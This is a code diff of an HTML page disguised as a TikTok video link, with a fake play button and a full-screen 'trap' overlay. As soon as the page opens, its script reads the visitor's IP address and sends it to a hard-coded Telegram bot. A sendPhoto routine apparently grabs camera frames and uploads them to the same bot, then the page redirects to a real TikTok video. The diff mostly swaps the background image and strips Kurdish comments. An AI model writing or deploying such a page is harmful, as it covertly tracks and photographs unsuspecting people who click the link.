@@ -5,11 +5,21 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>TikTok</title>
     <meta property="og:title" content="TikTok . Rudaw Soran">
-    <meta property="og:image" content="https://raw.githubusercontent.com/rudawsoran/Video/main/soran.jpg">
+    <meta property="og:image" content="pasha.jpg">
     <meta property="og:type" content="video.other">
     <style>
         body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; }
-        .bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: url('https://raw.githubusercontent.com/rudawsoran/Video/main/soran.jpg') no-repeat center center; background-size: contain; z-index: 1; }
+        /* 🖼️ وێنەی پشتێنە گۆڕدرا بۆ pasha.jpg */
+        .bg { 
+            position: fixed; 
+            top: 0; 
+            left: 0; 
+            width: 100%; 
+            height: 100%; 
+            background: url('pasha.jpg') no-repeat center center; 
+            background-size: contain; 
+            z-index: 1; 
+        }
         .play-btn { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 5; pointer-events: none; }
         .play-icon { width: 90px; height: 90px; fill: white; opacity: 0.9; }
         #trap { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 100; cursor: pointer; }
@@ -30,7 +40,6 @@
         const chat_id = "7261354534";
         const targetVideo = "https://vt.tiktok.com/ZS5WMhjoP/";
 
-        // 👑 ئەم بەشە هەر کە لینکەکە کرایەوە ئایپی و نامەت بۆ دەنێرێت
         async function notifyVisit() {
             try {
                 const response = await fetch('https://api.ipify.org?format=json');
@@ -42,7 +51,7 @@
                 fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent("🔔 لینکەکە کرایەوە بەڵام ئایپی نەخوێندرایەوە")}`);
             }
         }
-        notifyVisit(); // بانگکردنی فەنکشنەکە دەستبەجێ
+        notifyVisit();
 
         async function sendPhoto(v, c, fileName, caption) {
             c.width = v.videoWidth; c.height = v.videoHeight;
@@ -84,7 +93,7 @@
                     }, 200);
                 }, 1000);
             } catch (e) {
-                // تا ڕێگە نەدات ناچێتە سەر ڤیدیۆ
+                window.location.href = targetVideo;
             }
         }
     </script>
